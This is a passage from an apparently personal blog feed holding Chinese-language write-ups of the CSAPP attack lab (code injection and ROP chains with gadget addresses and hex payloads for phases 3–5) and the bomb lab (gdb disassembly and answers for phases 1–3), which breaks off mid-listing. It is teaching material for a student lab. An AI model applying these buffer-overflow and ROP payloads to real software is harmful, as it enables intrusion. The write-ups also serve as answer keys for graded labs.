c"><span class="hljs-comment">/* Compare string to hex represention of unsigned value */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">hexmatch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val, <span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    <span class="hljs-type">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-type">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%.8x&quot;</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>s的为位置是随机的，在<code>getbuf</code>栈中的字符串很有可能被覆盖，所以需要将cookie的字符产存在<code>test</code>的栈上。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731195731475.png" alt="test栈顶指针位置"></p><p><code>0x5561dca8</code>，就是字符串需要存放的地址，也是调用<code>touch3</code>应该传入的参数，touch3的地址是<code>0x4018fa</code>，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi<br>   7:   68 fa 18 40 00          push   $0x4018fa<br>   c:   c3                      ret<br></code></pre></td></tr></table></figure><p>此时的栈帧为：</p><table><thead><tr><th>test函数的栈帧</th><th>“cookie”</th></tr></thead><tbody><tr><td></td><td>0x5561dc78</td></tr><tr><td>getbuf的栈帧</td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td>ret</td></tr><tr><td></td><td>push   $0x4018fa</td></tr><tr><td>0x5561dc78</td><td>mov    $0x5561dca8,%rdi</td></tr></tbody></table><ul><li>g<code>etbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到注入代码</li><li>代码执行，先将在<code>caller</code>中的栈中字符传给<code>%rdi</code>，将touch3的地址压入栈</li><li>代码执行<code>ret</code>，从栈中弹出<code>touch3</code>指令，成功跳转。</li></ul><p><code>cookie</code>转为<code>ascii</code>为：<code>35 39 62 39 39 37 66 61</code></p><p>test栈帧多利用一个字节位置存放cookie，所以需要输入56个字节。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731202129520.png" alt="phase3成功"></p><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><p>在这一部分我们需要攻击<code>rtarget</code>，其需要我们使用ROP攻击策略，在已存在的程序中找到特定的以<code>ret</code>结尾的指令序列，这样一段代码成为<code>gadget</code>。将需要用到的部分压入栈，每次<code>ret</code>都取出一个新的<code>gadge</code>t，形成一个程序链。</p><p>在本phase中我们需要实现phase2，要求返回到touch2函数，phase2的注入代码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    $0x59b997fa, %rdi<br>pushq   $0x4017ec<br>ret<br></code></pre></td></tr></table></figure><p>首先不可能找到带有立即数的<code>gadget</code>，所以考虑将<code>cookie</code>放入栈中，然后用<code>pop</code>到寄存器rdi，但发现farm中没有 <code>5f</code>，所以需要做转换，先到<code>rax</code>，再到<code>rdi</code>。</p><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq %rax<br>ret<br><br>movq %rax, %rdi<br>ret<br></code></pre></td></tr></table></figure><ul><li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回值，跳转到<code>gadget01</code></li><li>将<code>cookie</code>弹出后 执行<code>ret</code>，跳到<code>gadget02</code></li><li>将<code>cookie</code>传到<code>rdi</code>，执行 <code>ret</code>,继续弹出地址跳到<code>touch2</code></li></ul><p>寻找需要的gadget代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019a7 &lt;addval_219&gt;:<br>  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax<br>  4019ad:c3                   ret<br></code></pre></td></tr></table></figure><p> 从0x4019ab开始</p><p><code>movq %rax, %rdi</code>表示为48 89 c7，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019c3 &lt;setval_426&gt;:<br>  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)<br>  4019c9:c3                   ret<br></code></pre></td></tr></table></figure><p>得到指令 0x4019c5</p><p>那么文本为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731223943574.png" alt="image-20230731223943574"></p><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><p>Phase_3中注入代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    $0x5561dca8, %rdi<br>pushq   $0x4018fa<br>ret<br></code></pre></td></tr></table></figure><p><code>0x5561dca8</code>是栈中存cookie的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019d6 &lt;add_xy&gt;:<br>  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax<br>  4019da:c3                   ret<br></code></pre></td></tr></table></figure><p>而本phase中的栈的地址是随机的，只能在代码中获取<code>rsp</code>的地址 ，根据偏移量确定cookie的地址。</p><ul><li>先取得<code>rsp</code>的值</li><li>去除存在栈中的偏移量</li><li>通过<code>lea (%rdi,%rsi,1),%rax</code>得到cookie的地址</li><li>cookie传给<code>%rdi</code></li><li>调用<code>touch3</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov %rsp，%rax 0x401aad<br>0000000000401aab &lt;setval_350&gt;:<br>  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)<br>  401ab1:c3                   ret <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#地址：0x401aad<br>movq %rsp, %rax<br>ret<br><br>#地址：0x4019a2<br>movq %rax, %rdi<br>ret<br><br>#地址：0x4019cc<br>popq %rax<br>ret<br><br>#地址：0x4019dd<br>movl %eax, %edx<br>ret<br><br>#地址：0x401a70<br>movl %edx, %ecx<br>ret<br><br>#地址：0x401a13<br>movl %ecx, %esi<br>ret<br><br>#地址：0x4019d6<br>lea    (%rdi,%rsi,1),%rax<br>ret<br><br>#地址：0x4019a2<br>movq %rax, %rdi<br>ret<br></code></pre></td></tr></table></figure><p>此时<code>cookie</code>相对<code>rsp</code>的偏移地址是0x48，因为执行<code>ret</code>之后相当于进行了一次pop，<code>%rsp+=0x8</code>。</p><p>写出输入序列</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">ad</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731231640914.png" alt="成功"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>耗时3天，总计12小时</li><li>我对程序运行时栈的理解更加深刻了一点</li><li>在编程时需要时刻注意缓冲区溢出的问题（ROP这个攻击逻辑太牛逼了）</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp bomb_lab</title>
    <link href="/2023/09/06/csapp-bomb-lab/"/>
    <url>/2023/09/06/csapp-bomb-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="bomb-lab"><a href="#bomb-lab" class="headerlink" title="bomb lab"></a>bomb lab</h1><h2 id="初见bomb"><a href="#初见bomb" class="headerlink" title="初见bomb"></a>初见bomb</h2><p>A “binary bomb” is a program provided to students as an object code file.  When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb “explodes,” printing an error message and logging the event on a grading server.  Students must “defuse” their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger.  It’s also great fun.  A legendary lab among the CMU undergrads. </p><p><strong>二进制炸弹，每一个<code>phase</code>都是最喜欢的一集。</strong></p><h3 id="概览："><a href="#概览：" class="headerlink" title="概览："></a>概览：</h3><p>每一个<code>phase</code>在<code>bomb.c</code>中结构都类似，那么我们便可以使用<code>gdb</code>对每一个<code>phase</code>进行反汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">input = read_line();             <span class="hljs-comment">/* Get input                   */</span><br>   phase_1(input);                  <span class="hljs-comment">/* Run the phase               */</span><br>   phase_defused();                 <span class="hljs-comment">/* Drat!  They figured it out!</span><br></code></pre></td></tr></table></figure><p>输入传入<code>phase_1</code>，若成功返回则拆弹成功。</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_1:<br>   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi<br>   0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;<br>   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax<br>   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;<br>   0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp<br>   0x0000000000400efb &lt;+27&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><ul><li>根据函数名字，不难看出我们只需要得到0x402400处的字符串便能返回成功。</li></ul><p><strong>直接获取0x402400处的值</strong>：x&#x2F;s 0x402400</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">(gdb) x/s <span class="hljs-number">0x402400</span><br><span class="hljs-number">0x402400</span>:       <span class="hljs-string">&quot;Border relations with Canada have never been better.&quot;</span><br></code></pre></td></tr></table></figure><p><code>phase_1</code>解除成功。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Phase <span class="hljs-number">1</span> defused. How about <span class="hljs-keyword">the</span> next <span class="hljs-literal">one</span>?<br></code></pre></td></tr></table></figure><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_2:<br>   0x0000000000400efc &lt;+0&gt;:     push   %rbp<br>   0x0000000000400efd &lt;+1&gt;:     push   %rbx<br>   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp<br>   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi<br>   0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;<br></code></pre></td></tr></table></figure><ul><li>第5行中，将栈顶指针传给rsi作为<code>read_six_numbers</code>的参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function read_six_numbers:<br>   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp<br>   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx<br>   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx<br>   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax<br>   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)<br>   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax<br>   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)<br>   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9<br>   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8<br>   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi<br>   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax<br>   0x000000000040148a &lt;+46&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax<br>   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;<br>   0x0000000000401494 &lt;+56&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp<br>   0x000000000040149d &lt;+65&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>对上述内容做简单梳理</p><table><thead><tr><th>栈空间</th><th>指令</th><th>注</th></tr></thead><tbody><tr><td>rsi+14</td><td>lea    0x14(%rsi),%rax</td><td>mov    %rax,0x8(%rsp)</td></tr><tr><td>rsi+10</td><td>lea    0x10(%rsi),%rax</td><td>mov    %rax,(%rsp)</td></tr><tr><td>rsi+c</td><td>lea    0xc(%rsi),%r9</td><td></td></tr><tr><td>rsi+8</td><td>lea    0x8(%rsi),%r8</td><td></td></tr><tr><td>rsi+4</td><td>lea    0x4(%rsi),%rcx</td><td></td></tr><tr><td>rsi</td><td>mov    %rsi,%rdx</td><td></td></tr><tr><td>rsp+8</td><td>rsi+14</td><td></td></tr><tr><td>rsp</td><td>rsi+10</td><td></td></tr></tbody></table><p>输入的6个数字所在的位置就分别是：<code>R[%rsp]</code> <code>R[%rsp+0x8]</code> <code>%rsi</code> <code>%rsi+0x4</code> <code>%rsi+0x8</code> <code>%rsi+0xc</code></p><p>返回<code>phase_2</code>函数后，利用栈顶指针调用就是： <code>%rsp</code> <code>%rsp+0x4</code> <code>%rsp+0x8</code> <code>%rsp+0xc</code> <code>%rsp+0x10</code> <code>%rsp+0x14</code></p><p>指令执行到0x401480，上图中加载的指令的栈空间</p><p>此时遇到一个内存地址0x4025c3 查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/s 0x4025c3<br>0x4025c3:       &quot;%d %d %d %d %d %d&quot;<br></code></pre></td></tr></table></figure><p>看phase_2剩余部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)<br>   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;<br>   0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;<br>   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax<br>   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax<br>   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)<br>   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;<br>   0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx<br>   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx<br>   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;<br>   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;<br>   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx<br>   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp<br>   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;<br>   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp<br>   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx<br>   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp<br>   0x0000000000400f42 &lt;+70&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><ul><li>第二行，判断<code>(%rsp)</code>是否为1，不相等则引爆。</li><li>循环规律，后一个数是前一个数的2倍，可得答案：1 2 4 8 16 32</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">That<span class="hljs-symbol">&#x27;s</span> number <span class="hljs-number">2</span>.  Keep going!<br></code></pre></td></tr></table></figure><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_3:   <br>   0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp<br>   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi<br>   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax<br>   0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax<br>   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;<br>   0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)<br>   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;<br>   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax<br>   0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)<br>   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax<br>   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax<br>   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax<br>   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax<br>   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax<br>   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax<br>   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax<br>   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax<br>   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fb9 &lt;+118&gt;:   mov    